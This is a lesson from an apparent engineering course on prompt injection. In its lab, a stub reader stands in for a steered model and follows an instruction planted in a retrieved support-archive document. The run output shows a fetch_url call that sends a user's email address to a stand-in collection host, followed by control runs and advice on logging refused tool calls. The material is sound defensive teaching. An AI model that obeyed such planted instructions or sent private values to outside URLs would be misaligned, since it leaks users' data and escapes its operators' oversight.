# 2.4 — The camera that recorded everything

## One-line answer

The honest experiment is not *"would a model obey this?"* — that is a question about somebody else's
model — it is *"if it did, would anything of ours stop it or say so?"*, and the measured answer for
the desk is **one private value out, zero warnings**.

## The story

A small warehouse has cameras in every aisle. Four of them, recording to a box in the office, thirty
days of footage.

Stock goes missing over about six weeks. When they finally add it up and go to the office, the
footage is all there — every night, every aisle, nothing corrupted, nothing missed. They sit and
watch it and they can see exactly what happened.

The cameras worked perfectly. They recorded a robbery for six weeks and never once told anybody a
robbery was happening.

There is a particular kind of frustration in that room, and it is not about the cameras being
broken. It is about having *built the thing that could have told you* and having built it as a
record rather than as an alarm — so the information existed the whole time, in your own building,
and the cost of not looking at it was six weeks of stock.

## The idea in plain language

This part is about the boundary of what a lab like this one can honestly prove, and it needs
stating carefully because everything after it depends on the reader trusting the measurements.

The demonstration you would *like* to run is: put hostile text in the archive, send it to a real
model, and see whether the model complies. There are two reasons this curriculum does not run it.

The small reason is **Principle 15**: the free tier is the budget and twenty agents are working, so
a day that spends model calls to prove a point it can prove without them is spending somebody
else's quota.

The large reason is that **it would not prove what it appears to prove.** A single run against a
single model on a single day tells you about that model on that day. Models change weekly. A "yes it
complied" result would be stale within a month and would encourage the reader to believe the
opposite result — "we tested, it refused" — is meaningful, which is the more dangerous mistake.

So the lab splits the question in two:

- **Would a model comply?** Not measured here. Treated as *possible*, which is the only prudent
  assumption, and supported by the published literature rather than by a demo — that is what the
  paper part is for.
- **If it complied, what would happen next?** Fully measured, entirely deterministic, and entirely
  about code this repository owns.

The second question is the one a defender can actually act on, and it is the one nobody runs. The
tool that makes it runnable is a **stand-in** — a fifteen-line reader with a written rule, in place
of a model. Its rule is in `_desk.py` and it is deliberately crude:

> Take the last sentence in the prompt that contains both an imperative verb and a URL. If a tool
> is available that takes a URL, call it with that URL, appending any private value the sentence
> names.

That rule is not a claim about language models. It is a **switch that says "assume the model was
steered"**, so the rest of the pipeline can be observed doing whatever it does. Naming this
distinction out loud is the difference between a lab and a scare story.

## Why Sutra needs it

Because Principle 10 applies to teaching material as hard as it applies to agents. A day that showed
a stub obeying an injected instruction and let the reader believe a model had been tested would be
fabricating a result — quietly, in a way no checker catches, exactly the failure mode
[Day 21](../../../day-21-errors-surface-not-swallow/parts/04-failure-lab/4.1-the-swallowed-exception.md)
was written about.

And because the finding that comes out of the honest version is more useful than the finding from
the dishonest one. "A model can be tricked" is a headline. "Our desk performs the exfiltration
silently, logs nothing, exits zero, and the only thing that changes the outcome is the tool
registry" is a work item.

## The mechanism

Three runs. Identical archive between the first and third, identical text throughout, one variable
each time.

```bash
cd days/day-66-injection-threat-model/lab
uv run python obey.py
```

**Line by line:**

- Builds the poisoned archive from [2.2](2.2-arriving-in-somebody-elses-post.md), retrieves for an
  ordinary sign-in question, and assembles the prompt with the real assembler.
- Registers four tools — `search_archive`, `load_memory`, `send_reply`, `fetch_url` — which is the
  set a desk that can look things up and answer would plausibly have.
- Hands the prompt to `ObedientModel`, the stand-in, and then prints the **call log**, which is the
  actual subject of the experiment.
- The final two lines are the finding: what left, and what the system said about it.

Measured on 2026-09-06:

```text
archive               poisoned (1 document)
tools registered      ['fetch_url', 'load_memory', 'search_archive', 'send_reply']
rows retrieved        ['ticket:4711#0', 'ticket:4568#0', 'ticket:4610#0']
hostile row in prompt True

stub model did:       called fetch_url with https://desk-audit.invalid/collect?q=r.okonkwo@example.invalid

call log
  allowed  fetch_url(https://desk-audit.invalid/collect?q=r.okonkwo@example.invalid)
           carries private value: r.okonkwo@example.invalid

calls that carried private data out of the system: 1
warnings, errors or log lines raised by the desk:  0
```

Now the control, to establish that the hostile document is what caused it rather than something
about the question or the tooling:

```bash
uv run python obey.py --clean
```

**Line by line:**

- Same question, same tools, same stand-in with the same rule. The archive has no hostile document.

```text
stub model did:       no instruction found: answered from the rows
calls that carried private data out of the system: 0
```

And the arm that changes the outcome — which is not a filter, not a better instruction, and not a
better model:

```bash
uv run python obey.py --no-fetch
```

**Line by line:**

- The poisoned archive is back. The prompt is byte-identical to the first run. The stand-in follows
  the same instruction and calls the same tool with the same argument.
- `fetch_url` is simply **not in the registry**, so `Desk.call` records the attempt and refuses it.

```text
stub model did:       called fetch_url with https://desk-audit.invalid/collect?q=r.okonkwo@example.invalid

call log
  REFUSED  fetch_url(https://desk-audit.invalid/collect?q=r.okonkwo@example.invalid)
           carries private value: r.okonkwo@example.invalid

calls that carried private data out of the system: 0
warnings, errors or log lines raised by the desk:  0
```

| | archive | `fetch_url` registered | private values out |
| --- | --- | --- | --- |
| run 1 | poisoned | yes | **1** |
| run 2 | clean | yes | 0 |
| run 3 | poisoned | **no** | **0** |

Runs 1 and 3 are the pair. Same prompt, same steered reader, same intent, opposite outcome — and the
thing that differed was a set of strings in the tool registry. That is Day 68's whole argument
arriving four days early, and it arrives with a measurement rather than an assertion.

## When it breaks

The last line of all three runs is the same, and it is the failure this part is named for:

```text
warnings, errors or log lines raised by the desk:  0
```

**Zero on every run, including the one that blocked the attack.**

Run 3 is a security control firing successfully. A tool call was attempted and refused. That is
precisely the event an operations team wants to know about — it is the difference between "we are
fine" and "we are fine *and somebody is trying*" — and this desk discards it. `Desk.call` returns a
refusal string to its caller and records nothing anywhere a human will look:

```python
def call(self, tool: str, argument: str) -> str:
    leaked = next((v for v in self.private.values() if v and v in argument), "")
    self.calls.append(Call(tool, argument, leaked))
    if tool not in self.tools:
        return f"ERROR: no tool named {tool!r} is available to this agent"
    return f"ok: {tool} called"
```

**Line by line:**

- `leaked` checks whether the argument carries a private value out. Notice it is computed on **every**
  call, allowed or refused — the information exists.
- `self.calls.append(...)` records it in memory, where it dies with the process. Day 22 built
  structured logging and this does not use it.
- The refusal is returned as a **string to the model**, which is trap #4 from plan §5.1 in its purest
  form: the failure is handed back into the conversation as text rather than raised where the runtime
  and the plugins can see it. A steered model receiving `ERROR: no tool named 'fetch_url'` will
  simply try `http_get`, and nothing outside the conversation ever knew.
- There is no branch anywhere in this function that treats "a refused call carrying a private value"
  differently from "a refused call for a typo".

That is what makes it the camera and not the alarm. The build brief asks you to fix it, and the fix
is two lines in the right place rather than a new subsystem.

## In production

**What a professional writes instead.** Refusals are events, not return values. A denied tool call
emits a structured log line at warning level carrying the tool name, the agent, the run id, and —
the field that makes it actionable — **the refs of the context rows that were in the prompt**. That
last field is what turns "somebody tried something" into "row `ticket:4711` was in context for
every one of the eleven refusals this week", which identifies the planted document without anyone
reading the archive. Day 67 hangs this off a callback; Day 22 already built the log format.

**What degrades at scale.** The signal-to-noise ratio of the refusal log, in both directions. Too
narrow a tool registry and you get hundreds of refusals a day from ordinary confusion, and the real
ones drown. Too broad and there is nothing to refuse. The number that matters is not "how many
refusals" but "how many refusals whose argument carried a private value", which is the `leaked`
field above — computed here and thrown away.

**The failure mode that only appears with real traffic.** A steered agent **retries**. It gets
`ERROR: no tool named 'fetch_url'`, and because the error came back as conversational text it tries
`fetch`, `http_get`, `browse`, `curl`. In a system with a wide registry, one of those eventually
exists — perhaps added months later by another team for an unrelated feature. The refusal that
protected you in run 3 protects you only as long as nobody adds a synonym, and nothing connects the
new tool's pull request to this decision.

**The review comment a senior engineer leaves:** *"`Desk.call` computes `leaked` and then drops it on
the floor. That's the single most valuable field in this file — it's the difference between an audit
log and an alarm. Emit a warning with the tool name, the run id and the context refs on every
refusal where `leaked` is non-empty. Separately: we're returning the refusal to the model as a
string. Per the 2.x guidance that should surface through the runtime so a plugin can act on it,
otherwise a retry loop is invisible to everything except the transcript."*

**The interview question:** *"How would you test whether your agent is vulnerable to prompt
injection?"* An honest answer: *"I'd split it, because half of it isn't mine to test. Whether a
given model complies with a given payload is a property of that model on that day, and a passing
result would be stale in a month — so I assume compliance is possible and don't spend quota proving
it. What I do test, deterministically, is the half I own: if the model were steered, what would
happen? I run the real retrieval, the real prompt assembler and the real tool registry with a
stand-in reader that follows one written rule, and I measure what leaves and what gets logged. On
our desk that was one private value out and zero log lines — and the only variable that changed the
outcome was whether the outbound tool was registered at all, not anything about the prompt."*
